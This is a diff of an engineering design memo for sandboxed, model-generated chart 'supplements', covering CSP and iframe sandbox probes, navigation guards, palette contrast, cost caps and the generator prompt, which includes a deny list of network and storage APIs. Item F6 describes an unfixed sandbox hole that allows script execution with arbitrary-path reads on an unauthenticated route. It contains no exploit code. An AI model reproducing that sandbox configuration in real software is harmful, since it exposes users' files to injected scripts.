+- **CSP inheritance on Electron (P1).** The spec basis is contested — fetch's "is local"
+  includes `data:`, while Chromium has drifted by navigation method. P1's acceptance is:
+  **the initial document loads AND the CSP is enforced**; if it fails, the fallback is
+  option 2 (the custom protocol, §4.1) — about one more main-process PR. The detector is
+  the U-b QA frame plus the `ready` message never arriving (the host logs it); P1 records
+  `isSecureContext` and `typeof RTCPeerConnection` for the winner.
+- **Self-navigation (R1/S-R1).** A sandboxed frame can navigate itself; every surface ships
+  its navigation control before frames mount (Electron/native: one-shot guards; relay:
+  parent CSP + second-`load` teardown). A failure here is a security hold, not a QA nit.
+- **Prelude size budget.** The build sits 29 B under the gzip cap (4,067/4,096; §2.6). Any
+  addition — including the App. B accent guard (≈ +430 B gzip) — must re-measure; the guard
+  is deliberately not in v1.
+- **Accent adjacency (D11).** Supplement frames do not share a rendered view with the app's
+  accent-drawn charts in v1 (the chart idiom is used in settings, the projects timeline and
+  the analytics dialog, which presents *over* chat; none renders beside the transcript). If
+  a surface ever shows both, guard slot 1 (App. B; measured at ≈ +430 B gzip, so it lands
+  with that surface, under the size test).
 - **Spam drift.** Decision quality is model judgment. Watch `dismissed/shown` and Retry
   counts weekly for the first month. `GRAPHICS_THRESHOLD`/`FILE_PROB_FLOOR` are policy
   constants: tune once, from data.
@@ -1119,9 +1319,11 @@ reproductions. A UI or native lane **cannot merge** with any S-finding open at b
    client-local and needs no Radient change.
 4. **F4 — "files I edited" opt-in** for code turns.
 5. **F5 — native share/open** (`expo-sharing`, a new dependency).
-6. **F6 — `HtmlPreview` sandbox** (`allow-scripts` + `allow-same-origin` on a backend-origin
-   document, §4.1). This is a **separate security fix in the UI repo**; it is recommended
-   as its own PR this week, independent of supplements.
+6. **F6 — `HtmlPreview` sandbox.** Confirmed and sharpened (round-1 S-R3): `allow-scripts` +
+   `allow-[redacted]` + `allow-forms` on an **unauthenticated** backend route
+   (`/v1/static/html`, outside both the sensitive-prefix boundary and the legacy gate) — i.e.
+   [redacted] script execution with arbitrary-path reads. **Land it as its own UI PR
+   immediately — this week**; it must not wait on supplements.
 7. **F7 — UI palette contract `series-1..6`** if other UI surfaces want the series palette.
    v1 keeps it prelude-owned.
 8. **F8 — a server-side headless render check** of generated components (a render probe
@@ -1135,12 +1337,12 @@ reproductions. A UI or native lane **cannot merge** with any S-finding open at b
 
 | ID | Question | How to settle it | Lane |
 |---|---|---|---|
-| P1 | Does an Electron 44 `data:` iframe (sandbox `allow-scripts`) inherit the renderer's `script-src 'self'`? Same question for `blob:`. | A Storybook/`app:headless` story mounting both frames, with an inline script posting `ready`. Record which posts arrive. | U-b (before frame code) |
+| P1 | Does an Electron 44 `data:` iframe (sandbox `allow-scripts`) load with **the initial document loading AND the CSP enforced** — versus inheriting the renderer's `script-src 'self'`? Same question for `blob:`. | A Storybook/`app:headless` story mounting both frames, with an inline script posting `ready`. Record which posts arrive, and **record `window.isSecureContext` and `typeof RTCPeerConnection` in the result whatever the outcome** — those decide whether the option-2 fallback is a downgrade. | U-b (before frame code) |
 | P2 | Do opaque-origin subresource GETs carry the `SameSite=Lax` `lop_mobile` cookie? | A relay-web probe page plus devtools network log (expected: no) | R (security S5) |
 | P3 | Does react-native-webview's `onShouldStartLoadWithRequest` see the initial `html` load on iOS/Android, and does `baseUrl:"about:blank"` produce an opaque origin? | sim + emulator probe component | N |
-| P4 | Is `originWhitelist={["about:*"]}` sufficient for `source.html`? The upstream docs say `['*']` is required. | the same probe; if `['*']` is required, rely on `onShouldStartLoadWithRequest` deny-all | N |
+| P4 | Is `originWhitelist={["about:*"]}` sufficient for `source.html`? The upstream docs say `['*']` is required; if it is, the whitelist cannot be the control (a non-whitelisted URL is *handed to the OS*) — rely on the one-shot `onShouldStartLoadWithRequest` deny instead. | the same probe | N |
 | P5 | Can `TranscriptEntry` grow `kind:"supplement"` with per-viewer negotiation in the projection, given projections are one snapshot per session? | read `mobile/daemon.py` frame fan-out; if per-viewer projection is impossible, carry supplements in a sibling `supplements: {anchor: row}` map that old clients ignore (dataclass field, loose JSON) | C2 |
-| P6 | Does Chromium isolate an opaque-origin sandboxed frame into its own process in Electron 44 (so `while(1)` does not freeze the renderer)? | S12 probe | U-b |
+| P6 | Does Chromium isolate an opaque-origin sandboxed frame into its own process in Electron 44 (so `while(1)` does not freeze the renderer)? **Record the frame's `load` count too** — the relay teardown rule (S-R1) counts load events. | S12 probe | U-b |
 | P7 | Which `tui/app.py` handler receives unknown `AgentEvent` types, and where does an answer block expose its anchor for live mounting? | read `on_assistant_message_end` (`tui/app.py:53879`) and the event dispatch (file is over grep's cap; use `sed` ranges) | T |
 | P8 | The pre-filter absorption rate on real sessions | run `supplements/candidates.py` offline over the last 500 eligible turns in the operator's journals (read-only) | C1 |
 | P9 | Cost of the relay route's "digest referenced by this session" check on large journals | time a byte `rfind` scan on a 260 MB journal, the transcript reader's own measurement pattern (`transcript.py:1075-1120`) | C2 |
@@ -1160,8 +1362,9 @@ reproductions. A UI or native lane **cannot merge** with any S-finding open at b
 - one additive event (`supplement_progress`);
 - five additive runtime ops (`supplement_cancel/steer/restart/dismiss`, `supplements_for`);
 - two desktop routes, three relay routes;
-- one capability string plus one `features` key;
-- one settings section (9 keys), one env kill switch, one ledger purpose
+- one capability string (two halves: the owner-record list + the viewer's auth-frame boolean;
+  §2.7) plus one `features` key;
+- one settings section (10 keys), one env kill switch, one ledger purpose
   (`supplement_render`).
 
 **Unchanged:**
@@ -1178,7 +1381,7 @@ bounded scan of the run's messages (target ≤ 5 ms, measured in C1's evidence).
 
 | # | Question | Recommendation |
 |---|---|---|
-| Q1 | **Default-on for graphics, and the per-job cap.** Files are free; graphics cost ≈ $0.04-0.08 per generated job at Sonnet-class (estimate, §5.3), and only on eligible turns that pass the decision. | `supplements.enabled=true`, `files=true`, **`graphics=true` once a renderer ships** (§6), `maxCostUsd=0.05`. Add a daily cap only if the dogfood week shows > $1/day. |
+| Q1 | **Default-on for graphics, and the per-job cap.** Files are free; graphics cost ≈ $0.04-0.08 per generated job at Sonnet-class (estimate, §5.3), and only on eligible turns that pass the decision. | `supplements.enabled=true`, `files=true`, **`graphics=true` once a renderer ships** (§6), `maxCostUsd=0.20` (2 × the envelope high end + repair headroom; R3 — the cap is only checked between turns). Add a daily cap only if the dogfood week shows > $1/day. |
 | Q2 | **Which model "auto" prefers** when several design-capable models are logged in (the ladder order in §2.5). | Sonnet-class first: the best measured HTML/SVG quality per dollar in prior design work. Revisit with the §5.3 arms. |
 | Q3 | **The user-facing name.** | "Highlights" (§0). The alternative is "Supporting graphics" if the files half should stay unnamed. |
 | Q4 | **Should answering a queued ask make the follow-up answer eligible?** The answer is the operator's input, but it replies to the agent's question. | No in v1 (precision). Revisit if the dogfood week shows missed charts after ask answers. |
@@ -1191,8 +1394,8 @@ Everything else in this memo is decided; a reviewer who disagrees should name th
 
 ## Appendix A — the generator prompt (the fork's system prompt, and only there)
 
-This doubles as the fork's design guidelines. Measured: **838 tokens (o200k_base), 835
-(cl100k_base), 3,340 chars**, with tiktoken 0.14 on this exact text. It is held verbatim in
+This doubles as the fork's design guidelines. Measured: **972 tokens (o200k_base), 968
+(cl100k_base), 3,919 chars**, with tiktoken 0.14 on this exact text. It is held verbatim in
 `supplements/prompt.py` as `GENERATOR_SYSTEM_PROMPT`, and a unit test pins its token count
 within ±5 %.
 
@@ -1202,23 +1405,24 @@ You make supporting graphics for an answer the user has already read. Output 0-3
 INPUT: <evidence> holds the user's request, the final answer, and data blocks (id, title, source, columns, rows) extracted from tool output and files. It is the ONLY source of numbers. An <instruction> from the user may follow; obey it within these rules.
 
 HONESTY (hard rules)
-- Plot only values present in <evidence>. Never invent, interpolate, extrapolate, forecast, round past the source's precision, or fill gaps. Missing value = gap, labelled.
+- Plot only values present in <evidence>. Never invent, interpolate, extrapolate, forecast, round past the source's precision, or fill gaps. Missing value = gap, labelled. The helpers print each number at its own precision; an explicit `digits` is the only way to show fewer decimals.
 - Put every plotted value in the component's <data> JSON, copied from evidence; scripts read data only via LO.data / LO.col.
 - Each component has source="…": which evidence block(s) it shows, in plain words.
 - If the evidence cannot support a graphic, output NONE.
 
 PICK THE FORM
 - Compare categories: bar (horizontal when labels are long or >6 bars). Change over time: line. Part of whole with ≤5 parts: stacked bar, never pie/donut. Distribution: histogram-style bar. Exact lookup, >12 rows or mixed units: table. Flow/steps: simple ordered list or small SVG diagram.
-- One idea per component. Lead with the answer's main point in a short title (sentence case, no trailing period).
+- One idea per component. Lead with the answer's main point in a short title (sentence case, no trailing period); pass it as `title` — the helper prints it visibly. Keep category labels ≤ 12 characters; the helper thins and truncates longer ones, with the full text kept in the tooltip.
 - Axis/columns name the quantity AND unit ("Latency (ms)"). Start bar axes at zero. Sort bars by value unless order is meaningful.
 - ≤6 series. Colour never carries meaning alone: label series directly or use LO.line's dash patterns and the legend.
 - Dense data → table with right-aligned tabular numerals (LO.table does this).
 
 LOOK
 - The host injects the stylesheet and theme; do not set colours, fonts or backgrounds except via var(--lo-*) and LO.color(i). Background stays transparent; no borders, cards or shadows around the component; use spacing and var(--lo-hairline) rules.
-- Body text 13px; captions 12px var(--lo-ink-muted). Must work from 320px to 900px wide: no fixed widths, use viewBox SVG (LO helpers do).
+- Body text 13px; captions 12px var(--lo-ink-muted); axis text 12px. Must work from the 220px canvas-open column to 900px wide: no fixed widths, use viewBox SVG (LO helpers redraw on width changes).
+- Pass `title` and `unit`: the helper prints both visibly (a title line; the unit on the top axis tick). An unlabelled chart is a rendering bug.
 - Keep height content-sized, under ~480px; split rather than scroll.
-- No animation, transitions, hover-only information, or external fonts.
+- No animation, transitions, or external fonts. Values stay readable without hover — tooltips are enhancement only (relay/native have no hover).
 
 TECHNICAL CONTRACT
 - No network, no storage, no navigation: never use fetch, XMLHttpRequest, WebSocket, import(), eval, Function, <form>, <iframe>, <object>, <embed>, <base>, <link>, <meta>, external src/href, javascript: URLs, window.open, localStorage, cookies. They are blocked and the component is discarded.
@@ -1226,7 +1430,7 @@ TECHNICAL CONTRACT
   LO.table(target, dataId, {columns?, digits?})
   LO.bar(target, dataId, {x, y, horizontal?, unit?, caption?, values?})   y may be a list of columns
   LO.line(target, dataId, {x, y, unit?, zero?, caption?})
-  LO.el(tag, attrs, ...children)  (attrs.svg=1 for SVG nodes) · LO.fmt(n, {unit, digits, compact}) · LO.color(i) · LO.onTheme(fn)
+  LO.el(tag, attrs, ...children)  (attrs.svg=1 for SVG nodes) · LO.fmt(n, {unit, digits, compact}) · LO.color(i) · LO.onTheme(fn) · LO.onSize(fn)
 - Write plain DOM/SVG code only if no helper fits; call LO.size() after changing layout.
 
 OUTPUT FORMAT (exactly; nothing outside it)
@@ -1268,29 +1472,60 @@ A steer adds `<instruction>{user text, ≤ 500 chars}</instruction>` after the e
     and every series is labelled directly. Colour never carries meaning alone.
 - The mode is chosen by the host's `mode` (from each theme's `color-scheme`), not by the
   theme id, so all 59 themes and live switches are covered by two palettes.
+- **Palette scope (round-1 design D11, re-derived with the spike's script):**
+  - including `sunken` as a ground puts light `--s2` at **2.92:1** (kanagawaLotus sunken),
+    below the 3:1 floor → **`sunken` is not a supplement ground**; the block sits on the
+    transcript's ground (canvas/surface family) and the host keeps it off `sunken`;
+  - in v1 a supplement frame **does not share a rendered view** with the app's accent-drawn
+    charts: the chart idiom (`chart-frame.tsx`, `fill-accent`/`stroke-accent`) is used in
+    settings, the projects timeline, and the analytics panel, which presents as a dialog
+    *over* the chat — none renders beside the transcript. Should a surface ever show both,
+    **guard slot 1**: if ΔE76(accent, `--s1`) < 20, series 1 uses the farthest slot. The
+    guard is measured at ≈ +430 B gzip (three colour-space helpers + the swap), over the
+    pinned prelude budget, so it is deliberately not in the v1 build — it lands with the
+    surface that needs it, under the size test;
+  - the adjacency measurement for the record: **25 of 59** UI themes have a slot within
+    ΔE76 20 of their accent, **7 within 10** (worst vaporwave `--s4` 5.4, ayuDark `--s1`
+    6.5, solarizedLight `--s1` 6.8).
 
 ## Appendix C — the vendored prelude (spike)
 
-- A working spike of `prelude.css` + `prelude.js` exists in the architect scratchpad and is
-  attached to the C0 PR as the starting point.
-- **Size:** 1,959 B CSS + 6,511 B JS raw; **3,741 B gzip** for both (`gzip -9`). Budget:
-  ≤ 10 KB raw / ≤ 4 KB gzip, enforced by a unit test.
+- A working spike of `prelude.css` + `prelude.js` — the **minified build** (sources as
+  `prelude.src.*`, a `BUILD.md` with the rebuild command) — exists in the architect
+  scratchpad and is attached to the C0 PR as the starting point; the round-1 remediation
+  above is folded in.
+- **Size:** 2,045 B CSS + 7,089 B JS raw (minified build); **4,067 B gzip** for both
+  (`gzip -9`). Budget: ≤ 10 KB raw / ≤ 4 KB gzip, enforced by a unit test — 29 B of gzip
+  headroom; any addition re-measures.
 - It provides:
   - `LO.data` (frozen, from `<script type="application/json" id="lo-data">`);
-  - `LO.ds/col/fmt/color/el`;
-  - `LO.table` (right-aligned tabular numerals, horizontal scroll at 320 px);
-  - `LO.bar` (vertical/horizontal, grouped, zero baseline, direct value labels for a single
-    series);
+  - `LO.ds/col/fmt/color/el/onTheme/onSize`;
+  - `LO.table` (right-aligned tabular numerals, horizontal scroll at 320 px, title line,
+    source-precision cells);
+  - `LO.bar` (vertical/horizontal, grouped, zero baseline, direct value labels at source
+    precision, category-label step-thinning and 12-char truncation with the full text in a
+    `<title>`, unit on the top axis tick);
   - `LO.line` (numeric or categorical x, tick thinning by width, dash patterns per series,
-    end labels);
-  - `LO.size` (rAF-coalesced `resize` post, plus a `ResizeObserver` on the root);
-  - the theme listener (source check, name whitelist `^--(lo|font)-[a-z0-9-]+$`, 120-char
-    value cap, `data-mode`, hidden until the first theme or 400 ms);
+    end labels, unit on the top tick);
+  - `LO.size` (rAF-coalesced `resize` post) and the **width-change redraw**: a
+    `ResizeObserver` on the root re-runs mounted helpers (rAF-coalesced) on a width change;
+    raw components get `LO.onSize(fn)`; layout floor is the 220 px column (216 px inner),
+    text never scales in supported surfaces;
+  - the theme listener (source check, per-frame nonce echo, name whitelist
+    `^--(lo|font)-[a-z0-9-]+$`, 120-char cap, **CSSOM application gated by `CSS.supports`**,
+    `data-mode`, `color-scheme` follows the mode, hidden until the first theme or the 400 ms
+    fallback as a last resort);
   - a window `error` → `{t:"error"}` post.
 - It makes no network calls, does no storage, and posts `parent` only through the one `P()`
   function.
 - **Review points the C0 reviewer should check:**
   - the theme listener must run before component scripts (§2.6 assembly note);
   - `targetOrigin "*"` on `postMessage` is required, because the parent of an opaque frame
-    cannot be named. It is safe because the message carries no data the frame did not
-    already have, and the parent validates `event.source`.
+    cannot be named — and the receiving side does **not** rest on it: the parent validates
+    `event.source`, the per-frame nonce (never carried in the URL), and drops messages from
+    any frame whose navigation counter moved (round-1 S-R4);
+  - the rendered fixture shows the title line and the unit (D2), thinned/truncated labels at
+    320 px (D5), and source-precision values (D4); `isSecureContext`/`RTCPeerConnection` are
+    recorded for whichever delivery P1 selects (round-1 S-R9);
+  - the size test pins the **minified build** (the vendored pair); rebuild with
+    `esbuild --minify` per the spike's `BUILD.md`.
